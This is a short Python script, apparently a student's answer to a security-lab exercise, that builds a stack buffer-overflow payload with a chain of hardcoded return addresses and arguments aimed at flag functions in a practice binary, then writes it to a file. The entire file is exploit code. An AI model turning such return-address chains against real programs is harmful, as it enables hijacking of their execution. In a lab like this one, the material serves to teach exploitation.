import struct

# Convert integer to byte array (integer little endian).
def dw(i):
    return struct.pack("<I",i)

# TODO 1: Fill this with offset to return address location.
offset = 9

# TODO: Fill this with the address of the flag1() function.

# TODO: Fill this with the address of the flag2() function.
# Initialize payload.
payload = ''

# Add a number of 'offset' A characters to the payload.
payload += '3'
payload += 'A' * offset

payload += dw(0x08048895)
payload += dw(0x08048736)

payload += 'A' * 16

payload += dw(0x80488ba)
payload += dw(0x8048736)
payload += dw(0xdeadc0de) #argumentul 1

payload += 'A' * 12

payload += dw(0x80488ea)
payload += dw(0x8048853)
payload += dw(0x78f26913) #argumentul 1
payload += dw(0x65bb55dc) #argumentul 2


payload += 'ConstantinPeticila'
# TODO: Add more to the payload such as the value overwriting the return address.
# Use dw() function.

with open('payload', 'wb') as f:
    f.write(payload)
